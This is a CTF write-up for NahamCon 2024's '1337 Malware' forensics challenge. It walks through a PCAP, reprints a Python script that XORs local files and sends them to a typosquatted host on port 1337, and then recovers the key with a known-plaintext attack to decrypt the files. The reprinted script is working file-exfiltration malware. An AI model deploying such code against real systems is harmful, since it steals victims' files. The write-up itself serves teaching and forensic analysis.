 # 1337 Malware - NahamCon CTF 2024

 ## Challenge Description

 ```We received a plea for help from a rather frustrated looking employee. He said he accidently ran malware on his computer, but when he tried to pay the "leet hacker" to get his files back they said the malware was "broken"... best IT could do was provide us a PCAP.```

## Enumeration

We are given a PCAP file that will contain all the information needed to solve the challenge. Let's open it up in Wireshark.

![](./Attachments/wireshark.png)

Quickly looking through the capture, we have a majority of general TCP traffic as well as two HTTP packets. Let's looks closer at the HTTP request and see if there's anything interesting.

![](./Attachments/ransrequest.png)

We see a GET request to `vvindowsupdate.com/rans.py` - looks like the attacker has typosquatted the windowsupdate domain hoping to trick an unsuspecting user into navigating to their domain instead. `rans.py` is interesting so let's see if the response contains the script.

![](./Attachments/ransresponse.png)

Yes! We have the script used to exploit this user in plain text. Let's take a closer look at the payload.

```python
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)
```

The script starts off by importing the modules it needs to function, followed by a key declaration and a comment. It looks like the attacker didn't take his own advice and generated the key using a random 32 byte value. This is probably why the attacker believe his malware to be "broken".

We'll remember this for later and move on to the rest of the script.

```python
def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths
```

Here we have the three functions defined by the attacker to get the files in the current directory, encrypt them, and then send the encrypted version of the files back to his domain over port 1337.

Finally, the script executes these functions.

```python
files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
```

It appears as though the intention of the attacker was to encrypt and exfiltrate the users files, and then remove the files from the victim's computer, however `os.remove` is commented out.

`get_all_files()` isn't all that interesting, so let's skip that and look closer at `send_encrypted()`.

```python
def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()
```

The attacker was nice enough to name the files as they were exfiltrated by sending the file name to his server, which can be picked up through the network traffic.

To confirm, let's take another look at the PCAP.

![](./Attachments/filename.png)

Yep, they leaked the file names over the network. We can use this to our advantage later.

The encrypt function is going to be the most interesting for us, so let's take a closer look there.

```python
def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted
```

We can see that the only form of "encryption" in use is an XOR function, which takes the plaintext of the files and XORs each byte with the key. It will be very important to find the key as this will be the only way we are able to recover the encrypted files.

This is where the fact that file names are leaked comes in handy. If we look further at the files that were exfiltrated, we have this list:

- resources.zip
- ecorp.png
- Welcome Aboard.pdf
- id_rsa
- id_rsa.pub

Before we continue, let's talk quickly about XOR and it's viability in ciphertext generation. XOR by itself is not considered cryptographically secure. The exclusive or function is associative and commutative, which means that the order of input values and how they are grouped does not affect the final output. Also, XOR has a unique property that makes it possible to inverse input and output, called self-inversion. This is especially useful in cryptanalysis because it means that if you have the ciphertext and some corresponding plaintext, you can derive the key that was used to turn plaintext into ciphertext.

This is known as a known-plaintext attack (KPA). More information can be found [here](https://blog.nviso.eu/2023/10/12/xor-known-plaintext-attacks/).

Knowing this about the malware at hand, we know that if we had the plaintext of any of the encrypted files, we could easily derive the key using the XOR function itself.

It might seem like we don't have the plaintext, but we can make a few assumptions about the files that were exfiltrated.

The file formats for .zip, .png, and .pdf all use some form of "magic bytes", or the first few bytes of the file that indicate in what format the data is stored.

- .zip - `0x50 0x4B 0x03 0x04`
- .png - `0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A`
- .pdf - `0x25 0x50 0x44 0x46`

Theoretically we could use these byte strings to derive the key, but remember that we know the key is 32 bytes in length, so these values would only be able to recover the partial key.

That leaves us `id_rsa` and `id_rsa.pub`. Luckily, we know that id_rsa has a standard format. We can generate an openssh private key using `ssh-keygen` to confirm, but we know that every openssh private key starts with this string: `-----BEGIN OPENSSH PRIVATE KEY-----`.

Yes! This string is 36 characters in length which means it is greater than 32 bytes. We should be able to recover the key with this value.

First, we'll write a script that recovers the key using the ciphertext of the id_rsa file recovered from the PCAP and the known plaintext.

```python
from pwn import xor
import os

def recover_key():
    ciphertext = bytes.fromhex("afef7e7da6970900eeab4da38833...b5f55b98fb892d")

    known_plaintext = "-----BEGIN OPENSSH PRIVATE KEY-----".encode()

    blob = xor(ciphertext, known_plaintext)
    key = blob[:32]
    return key
```

This function XORs the ciphertext and known-plaintext and returns a blob of data, from which we can grab the first 32 bytes since we know that this is the beginning of the private key. This is the key that was used to encrypt the victim's files!

From there, we can write a script that iterates through the encrypted files downloaded from wireshark and decrypts them all.

```python
def decrypt(ciphertext, key):
    plaintext = xor(ciphertext, key)
    return plaintext

directory = "/home/astra/nahamconctf/forensics/1337malware"
for file in os.listdir(directory):
    if file.endswith('.enc'):
        with open(os.path.join(directory, file)) as f:
            ciphertext = bytes.fromhex(f.read())
            plaintext = decrypt(ciphertext, key)
            b = open(os.path.join(directory, file).strip(".enc"), "wb")
            b.write(plaintext)
```

Now that we have all the files decrypted, we can sift through them for any important information (like the flag!).

Resources.zip is interesting, let's try and unzip it:

![](./Attachments/resourcezip.png)

It's password protected. Let's see if we can find the password somewhere. Let's look at `Welcome Aboard.pdf` next.

![](./Attachments/welcomeaboard.png)

And we've got the password for the zip! All that's left to do is unzip `resources.zip` and get the flag!